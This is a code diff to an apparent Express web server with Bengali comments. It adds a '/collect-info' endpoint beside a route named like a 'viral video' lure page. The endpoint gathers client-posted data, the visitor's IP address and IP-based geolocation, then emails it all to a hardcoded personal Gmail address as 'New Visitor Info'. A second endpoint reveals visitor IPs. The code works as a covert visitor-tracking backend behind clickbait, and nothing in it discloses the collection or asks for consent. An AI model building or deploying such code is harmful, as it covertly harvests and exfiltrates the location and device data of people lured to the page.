@@ -29,6 +29,50 @@ app.get("/ridhi-viral-video/:id", (req, res) => {
 
 
 
+app.post("/collect-info", async (req, res) => {
+  try {
+    // ক্লায়েন্ট info
+    const clientInfo = req.body;
+
+    // সার্ভার থেকে IP
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+
+    // ipapi থেকে location info
+    let ipData = {};
+    try {
+      const resp = await fetch(`https://ipapi.co/${clientIp}/json/`);
+      ipData = await resp.json();
+    } catch(err) {
+      console.warn("ipapi fetch failed:", err);
+    }
+
+    const finalInfo = {
+      ...clientInfo,
+      ip: clientIp,
+      ...ipData
+    };
+
+    // ইমেইল পাঠানো
+    await transporter.sendMail({
+      from: "sojib01943075658@gmail.com",
+      to: "rajib01943075658@gmail.com",
+      subject: "📩 New Visitor Info",
+      html: `<h3>New Visitor Info</h3><pre>${JSON.stringify(finalInfo, null, 2)}</pre>`
+    });
+
+    console.log("✅ Visitor info sent:", finalInfo);
+    res.json({ ok: true });
+  } catch(err) {
+    console.error("❌ Email send error:", err);
+    res.status(500).json({ error: "Email failed" });
+  }
+});
+
+app.get("/my-ip", (req, res) => {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  console.log(ip)
+  res.json({ ip });
+});
 
 
 
